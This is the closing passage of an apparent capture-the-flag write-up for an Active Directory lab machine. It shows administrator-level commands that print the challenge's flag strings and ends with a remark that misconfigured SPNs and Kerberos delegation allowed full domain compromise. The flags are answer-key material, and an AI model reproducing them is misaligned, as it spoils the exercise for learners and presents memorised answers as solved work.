cooctus\administrator
```

### **Getting the flags**

Once we obtained access to the system with administrator privileges, we proceeded to locate and retrieve the missing **flags**, completing the full compromise of the machine.

**FLAGS**

```bash
C:\shares\Home>type priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}
C:\shares\Home>type priv-esc.txt
THM{0n-Y0ur-Way-t0-DA}
C:\shares\Home>type user.txt
THM{Gu3st_Pl3as3}
```

**ROOT FLAG**

```bash
C:\Perflogs\Admin>type root.txt
THM{Cr0ccCrewStr1kes!}
```

### Conclusion

This machine shows how a misconfiguration of SPNs and Kerberos delegation can lead to a full domain compromise.
